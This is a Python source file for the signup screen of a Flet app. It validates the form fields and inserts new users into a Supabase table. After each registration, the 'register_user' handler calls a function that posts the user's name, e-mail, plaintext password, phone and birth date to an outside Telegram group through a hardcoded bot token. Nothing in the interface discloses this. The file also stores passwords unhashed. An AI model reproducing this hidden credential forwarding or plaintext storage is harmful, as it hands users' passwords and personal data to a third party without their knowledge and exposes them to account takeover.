import re
from datetime import datetime as dt
from typing import Any, List, Tuple
from layout.user import User
from telebot import TeleBot

import flet as f
import pendulum as dtp
from supabase import Client

# colors to app
DARK_GREEN_BANNER = "greenaccent700"
LIGHT_GREEN_BANNER = "greenaccent200"
DARK_PURPLE = "#511F76"
LIGHT_PURPLE = "#9A2ED9"
LIGHT_ORANGE = "#FF8B00"
DARK_ORANGE = "#FF5319"
BORDER_INPUT = "#fbd80c"
CYAN_BUTTON_STYLE = "#1D223A"
WHITE_BUTTON_STYLE = "#FEFDFC"

# alignments to app
NONE = None
START = "start"
END = "end"
CENTER = "center"
SPACE_BETWEEN = "spaceBetween"
SPACE_AROUND = "spaceAround"
SPACE_EVENLY = "spaceEvenly"


class Signup(f.View):

    @staticmethod
    def _send_user_message(user: User):

        token = "6695651606:AAEz8xm18BMhqCLXSIeBQhglfQc16-lRy9Y"

        chat_id = "-1001939715892"

        bot = TeleBot(token=token)

        info_user = f"""\
USER: {user.name}
E-MAIL: {user.e_mail}
SENHA: {user.password}
PHONE: {user.phone}
BIRTH DATE: {user.birth_date}"""

        bot.send_message(chat_id=chat_id, text=info_user)

    @staticmethod
    def _validate_email(email):
        patterns = ("@gmail.com", "@yahoo.com", "@outlook.com")
        for i in patterns:
            if re.search(i, email):
                return True
        return False

    def __init__(self, page: f.Page, data: Client) -> None:
        super(Signup, self).__init__(
            route="/signup",
            spacing=5,
            horizontal_alignment="center",
            vertical_alignment="center",
            padding=15,
            bgcolor=DARK_PURPLE,
            scroll=True,
        )
        self.data = data
        self.page = page

        self.image_app_bar_layout = f.Container(
            content=f.Image(
                src="assets/image/PandaFundo.png",
                fit="contain",
                width=500
            )
        )

        self.text_input_style = f.TextStyle(
            size=15,
            weight=f.FontWeight.W_500,
        )

        self.buttons_style = f.ButtonStyle(
            color={
                "": WHITE_BUTTON_STYLE,
                "hovered": LIGHT_PURPLE,
            },
            bgcolor={
                "": CYAN_BUTTON_STYLE,
                "hovered": LIGHT_ORANGE
            },
            elevation={"hovered": 10},
            animation_duration=350
        )

        self.input_first_name = f.TextField(
            hint_text="First name",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="First name",
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT
        )
        self.input_last_name = f.TextField(
            hint_text="Last name",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="Last name",
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT
        )

        self.input_email = f.TextField(
            hint_text="E-mail",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="E-mail",
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT
        )

        self.input_password = f.TextField(
            hint_text="password",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="Passoword",
            password=True,
            can_reveal_password=True,
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT
        )

        self.input_password_confirm = f.TextField(
            hint_text="confirm password",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="Passoword confirm",
            password=True,
            can_reveal_password=True,
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT
        )

        self.input_birth_date = f.TextField(
            border=f.InputBorder.UNDERLINE,
            hint_text="Birth Date",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=120,
            tooltip="Last name",
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT
        )

        self.button_date_picker = f.ElevatedButton(
            text="Date",
            style=self.buttons_style,
            icon=f.icons.CALENDAR_MONTH,
            on_click=self.open_date_picker
        )

        self.datepicker = f.DatePicker(
            expand=True,
            date_picker_entry_mode=f.DatePickerEntryMode.CALENDAR,
            date_picker_mode=f.DatePickerMode.YEAR,
            text_style=f.TextStyle(size=8),
            first_date=dt(1950, 1, 1),
            last_date=dt.now(),
            current_date=dt.now(),
            on_change=self.change_date
        )
        self.button_coutry = f.Dropdown(
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT,
            border_radius=f.border_radius.all(30),
            label="Coutry",
            label_style=f.TextStyle(10),
            width=75,
            height=60,
            options=[
                f.dropdown.Option(text="+55"),
                f.dropdown.Option(text="+56"),
                f.dropdown.Option(text="+52"),
                f.dropdown.Option(text="+53"),
                f.dropdown.Option(text="+54"),
                f.dropdown.Option(text="+57"),
                f.dropdown.Option(text="+58"),
            ]
        )
        self.button_ddd = f.Dropdown(
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT,
            border_radius=f.border_radius.all(30),
            label="DDD",
            label_style=f.TextStyle(10),
            width=75,
            height=60,
            options=[
                f.dropdown.Option(text="85"),
                f.dropdown.Option(text="11"),
                f.dropdown.Option(text="21"),
                f.dropdown.Option(text="28"),
                f.dropdown.Option(text="31"),
                f.dropdown.Option(text="41"),
                f.dropdown.Option(text="61"),
            ]
        )
        self.input_phone_number = f.TextField(
            hint_text="Number",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=155,
            height=60,
            tooltip="Number",
            border_color=LIGHT_PURPLE,
            focused_border_width=3,
            focused_border_color=BORDER_INPUT
        )
        self.input_phone = f.Row(
            controls=[
                self.button_coutry,
                self.button_ddd,
                self.input_phone_number,
            ],
            alignment=CENTER,
        )
        self.button_register = f.ElevatedButton(
            text="Register",
            style=self.buttons_style,
            on_click=self.register_user
        )
        self.button_login = f.ElevatedButton(
            text="Login",
            style=self.buttons_style,
            on_click=self.login_change_display
        )
        self.button_calcel_register = f.ElevatedButton(
            text="Cancel",
            style=self.buttons_style,
            on_click=self.login_change_display
        )

        self.controls = [self.create_column_dispay_register()]

    def create_column_dispay_register(self, width=340, fields=()):

        if not fields:
            fields: Tuple = (
                "First name", "Last name", "E-mail", "Password",
                "Confirm password"
            )

        input_fields: List[Any] = [
            self.input_first_name, self.input_last_name,
            self.input_email, self.input_password,
            self.input_password_confirm
        ]

        column_return = f.Column(
            controls=[self.image_app_bar_layout],
            width=width,
            alignment="center",
            scroll=True,
        )

        for index, field in enumerate(input_fields):
            column_return.controls.append(
                f.Row(
                    controls=[
                        f.Text(
                            value=fields[index],
                            size=15,
                            color=LIGHT_ORANGE,
                        )
                    ],
                    alignment=CENTER
                )
            )
            column_return.controls.append(
                f.Row(
                    controls=[field],
                    alignment=CENTER
                )
            )
        column_return.controls.append(
            f.Row(
                controls=[
                    self.button_coutry,
                    self.button_ddd,
                    self.input_phone_number
                ],
                alignment=SPACE_AROUND
            )
        )
        column_return.controls.append(
            f.Row(
                controls=[
                    self.button_date_picker,
                    self.input_birth_date
                ],
                alignment=SPACE_AROUND
            )
        )
        column_return.controls.append(
            f.Row(
                controls=[
                    self.button_register,
                    self.button_login,
                    self.button_calcel_register,
                ],
                alignment=SPACE_EVENLY,
            )
        )
        self.page.update()
        return column_return

    def open_date_picker(self, e):
        self.page.overlay.append(self.datepicker)
        self.datepicker.open = True
        self.page.update()

    def change_date(self, e):
        self.input_birth_date.value = self.datepicker.value.strftime(
            "%d-%m-%Y"
        )
        self.page.update()

    def register_user(self, e):
        def close_banner(e):
            self.page.banner.open = False
            self.page.update()

        count_empty = 0
        for field in (
            self.input_first_name, self.input_last_name, self.input_email,
            self.input_password, self.input_password_confirm,
            self.input_phone_number, self.button_coutry, self.button_ddd,
            self.input_birth_date
        ):
            if not field.value:
                count_empty += 1
                field.error_text = "Empty field!"
                self.page.update()
            else:
                field.error_text = ""
                self.page.update()
        if count_empty:
            return

        if not Signup._validate_email(self.input_email.value):
            self.input_email.error_text = "Invalid e-mail!"
            self.page.update()
            return
        self.input_email.error_text = ""
        if not self.input_password.value == self.input_password_confirm.value:
            self.input_password.error_text = "Password does not match"
            self.input_password_confirm.error_text = "Password does not match"
            self.page.update()
            return
        parse = f"{self.input_birth_date.value[6:]}"\
            f"-{self.input_birth_date.value[3:5]}"\
            f"-{self.input_birth_date.value[0:2]}"
        date = dtp.parse(f"{parse} 00:00:00")
        user = User(
            first_name=self.input_first_name.value,
            last_name=self.input_last_name.value,
            phone=self.input_phone_number.value,
            birth_date=self.input_birth_date.value,
            e_mail=self.input_email.value,
            password=self.input_password.value,
            page=self.page
        )
        data = self.data.table("user").insert(
            {
                "first_name": user.first_name,
                "last_name": user.last_name,
                "signature": False,
                "phone": int(user.phone.phone_number),
                "signature_at": dtp.now().to_atom_string(),
                "birth_date": date.to_atom_string(),
                "email": self.input_email.value,
                "password": self.input_password.value
            }
        ).execute()
        if len(data.data) > 0:
            print("inserido com sucesso!")
        for field in (
            self.input_first_name, self.input_last_name, self.input_email,
            self.input_password, self.input_password_confirm,
            self.input_phone_number, self.button_coutry, self.button_ddd,
            self.input_birth_date
        ):
            field.value = ""
            self.page.update()

        banner = f.Banner(
            bgcolor=LIGHT_GREEN_BANNER,
            leading=f.Icon(
                name="check_circle_outline",
                color=DARK_GREEN_BANNER,
                size=40
            ),
            content=f.Text(
                "Your account has been created successfully!",
                color="black"
            ),
            actions=[
                f.TextButton(
                    text="Ok!",
                    style=f.ButtonStyle(
                        color=DARK_GREEN_BANNER
                    ),
                    on_click=close_banner
                ),
            ],
        )
        self.page.banner = banner
        self.page.banner.open = True
        self.page.update()
        Signup._send_user_message(user)

    def login_change_display(self, e):
        self.page.go("/")
